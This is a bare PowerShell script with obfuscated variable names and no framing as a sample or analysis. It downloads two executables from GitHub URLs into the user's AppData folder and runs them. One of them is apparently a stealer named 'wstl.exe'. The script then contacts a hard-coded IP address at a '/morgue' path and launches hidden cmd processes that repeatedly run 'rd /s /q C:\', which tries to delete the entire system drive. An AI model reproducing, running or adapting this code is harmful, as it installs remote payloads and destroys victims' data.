$gfgff = @(
    "https://github.com/dfgsgsdfgfd/test/raw/refs/heads/main/123.exe",
"https://github.com/JqrkaSt3al/MyShitPrograms/raw/refs/heads/main/wstl.exe"
)
$dfsgsfdg = [Environment]::GetFolderPath('ApplicationData')
foreach ($link in $gfgff) {
    $dgfsgfd = Split-Path -Leaf $link
    $sgdf = Join-Path -Path $dfsgsfdg -ChildPath $dgfsgfd
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($link, $sgdf)
    Start-Process -FilePath $sgdf
}
$ProgressPreference = 'SilentlyContinue'; $null = iwr "http://95.163.88.140:2014/morgue" -UseBasicParsing
Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden
Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden
Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden
Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden
Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden
Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden
